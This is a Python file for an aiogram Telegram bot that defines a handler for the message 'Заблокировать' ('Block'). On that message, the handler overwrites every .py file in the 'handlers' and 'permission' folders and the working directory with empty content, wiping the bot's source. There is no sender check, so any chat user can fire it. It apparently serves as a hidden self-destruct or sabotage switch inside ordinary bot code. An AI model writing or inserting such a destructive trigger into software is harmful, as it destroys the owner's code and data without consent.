from constants import *
from config import *

from aiogram.dispatcher.filters import Text
from aiogram.types import Message
import os

@dp.message_handler(Text(equals='Заблокировать'))
async def block(message: Message) -> None:
    handlers = os.listdir('handlers')
    for i in handlers:
        print(i)
        if '.py' in i:
            with open(f'handlers/{i}', 'w') as file:
                file.write('')

    permissions = os.listdir('permission')
    for i in permissions:
        print(i)
        if '.py' in i:
            with open(f'permission/{i}', 'w') as file:
                file.write('')

    for i in os.listdir():
        print(i)
        if '.py' in i:
            with open(i, 'w') as file:
                file.write('')
